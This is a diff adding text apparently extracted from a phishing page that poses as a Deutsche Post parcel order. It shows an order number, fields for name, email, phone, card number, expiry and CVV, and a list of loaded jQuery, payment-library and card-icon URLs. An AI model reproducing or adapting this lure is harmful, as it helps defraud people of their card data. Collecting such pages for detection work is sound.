@@ -1,0 +1,26 @@
+Auftragsnummer : DE/904951986
+Standardpaket
+Kartennummer:
+Datum Exp:
+Versand
+Gesamt
+Bedingungen für das Die Post Package ™
+Back to top
+
+DIEPOST Auftragsnummer : DE/904951986
+Standardpaket
+DEINE PERSONLICHEN DETAILS
+Name des Karteninhabers
+Email
+Handy Nummer
+BEZAHLEN SIE MIT KARTE VISA
+Kartennummer:
+Datum Exp: CVV:
+
+URLs:
+https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js
+https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js
+https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js
+https://img.icons8.com/color/36/000000/visa.png
+https://img.icons8.com/color/36/000000/mastercard.png
+https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js
